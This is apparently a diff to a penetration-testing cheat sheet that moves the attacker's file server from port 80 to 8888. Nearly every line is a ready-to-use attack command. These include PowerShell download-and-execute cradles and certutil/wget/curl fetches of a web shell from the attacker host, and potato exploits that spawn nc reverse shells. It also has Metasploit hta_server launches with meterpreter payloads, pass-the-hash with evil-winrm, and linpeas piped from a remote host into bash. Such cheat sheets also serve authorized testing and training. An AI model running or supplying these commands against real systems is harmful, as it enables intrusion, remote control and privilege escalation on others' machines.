@@ -99,11 +99,11 @@ sort -u usernames | tee usernames
 sort -u passwords | tee passwords
 
 ## File Transfer
-powershell -c "IEX (New-Object Net.WebClient).DownloadString(''http://$MYIP/tools.ps1''); dir C:\programdata\tmp"
-set cmd powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://$MYIP/tools.ps1');"
-wget http://$MYIP/shell.aspx -o shell.aspx
-curl http://$MYIP/shell.aspx -o shell.aspx
-certutil -urlcache -f http://$MYIP/shell.aspx shell.aspx
+powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/tools.ps1'); dir C:\programdata\tmp"
+set cmd powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/tools.ps1');"
+wget http://$MYIP:8888/shell.aspx -o shell.aspx
+curl http://$MYIP:8888/shell.aspx -o shell.aspx
+certutil -urlcache -f http://$MYIP:8888/shell.aspx shell.aspx
 
 ## Web
 [*] Web Shell
@@ -286,7 +286,7 @@ C:\programdata\tmp\EfsPotato.exe "C:\programdata\tmp\nc.exe $MYIP 5555 -e cmd"
 C:\programdata\tmp\SigmaPotato.exe --revshell $MYIP 5555
 
 +---------- Listeners ----------+
-python3 -m http.server 80 -d ~/Upload
+python3 -m http.server 8888 -d ~/Upload
 rlwrap nc -lvnp 5555
 rlwrap msfconsole -q -x "use exploit/windows/misc/hta_server; set LHOST $MYIP; set LPORT 5555; set SRVHOST $MYIP; set TARGET 1; set payload windows/x64/meterpreter/reverse_tcp; run"
 rlwrap msfconsole -q -x "use exploit/windows/misc/hta_server; set LHOST $MYIP; set LPORT 5555; set SRVHOST $MYIP; set TARGET 0; set payload windows/meterpreter/reverse_tcp; run"
@@ -554,12 +554,12 @@ evil-winrm -i "$TARGET" -u '$USERNAME' -H '$HASH'
 # Post-Exploitation 
 ## Fileserver
 mkdir -p ~/Upload/linux; mkdir -p ~/Upload/windows
-python3 -m http.server 80 -d ~/Upload
+python3 -m http.server 8888 -d ~/Upload
 
 ## Linux
 [*] Privilege Escalation
-wget -qO- $MYIP/linux/linpeas.sh | bash
-curl $MYIP/linux/linpeas.sh | bash
+wget -qO- http://$MYIP:8888/linux/linpeas.sh | bash
+curl http://$MYIP:8888/linux/linpeas.sh | bash
 
 find / -perm /4000 2>/dev/null | xargs ls -la
 sudo -l
